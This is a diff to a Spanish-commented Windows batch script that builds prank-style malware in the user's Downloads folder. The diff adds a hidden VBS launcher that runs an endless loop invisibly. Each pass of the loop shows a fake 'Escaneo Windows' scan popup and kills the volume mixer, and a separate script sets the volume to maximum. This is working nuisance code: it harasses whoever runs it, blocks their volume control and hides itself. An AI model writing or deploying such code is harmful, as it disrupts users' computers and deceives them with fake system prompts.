@@ -30,16 +30,13 @@ echo X=MsgBox("Quieres escanear el ordenador?",3+48,"Escaneo Windows") >> %userp
 rem Creacion del bucle de avisos
 echo :in  >> %userprofile%\Downloads\carpeta\bucle.bat 
 echo start %userprofile%\Downloads\carpeta\avisos.vbs  >> %userprofile%\Downloads\carpeta\bucle.bat
+echo taskkill /im SndVol.exe >> %userprofile%\Downloads\carpeta\bucle.bat
 echo timeout 1  >> %userprofile%\Downloads\carpeta\bucle.bat 
 echo goto :in  >> %userprofile%\Downloads\carpeta\bucle.bat 
 rem Iniciar programas
 start %userprofile%\Downloads\carpeta\volumenmaximo.vbs
-start %userprofile%\Downloads\carpeta\bucle.bat
+timeout 3
+rem start %userprofile%\Downloads\carpeta\bucle.bat
 start %userprofile%\Downloads\carpeta\voice.vbs
-
-
-
-
-
-
-
+echo CreateObject("Wscript.Shell").Run "%userprofile%\Downloads\carpeta\bucle.bat", 0, True > %userprofile%\Downloads\carpeta\ocultobucle.vbs
+start %userprofile%\Downloads\carpeta\ocultobucle.vbs
